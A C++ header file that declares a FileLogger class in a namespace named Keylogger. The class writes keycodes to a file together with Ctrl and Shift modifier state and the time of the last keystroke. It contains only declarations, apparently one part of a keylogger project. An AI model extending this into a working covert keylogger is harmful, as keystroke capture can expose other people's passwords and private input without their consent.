#ifndef FILELOGGER_H
#define FILELOGGER_H

#include "ILogger.h"

#include <fstream>

namespace Keylogger {

class FileLogger : public ILogger {
 public:
    bool open(IKeycodeMapper* mapper, std::string filename);
    void close();

    void logKeycode(int keycode, KeyState state);

 private:
    IKeycodeMapper* _mapper;
    std::ofstream _stream;

    bool _modifierCtrl;
    bool _modifierShift;

    std::time_t _lastKeystroke;
};

}

#endif // FILELOGGER_H
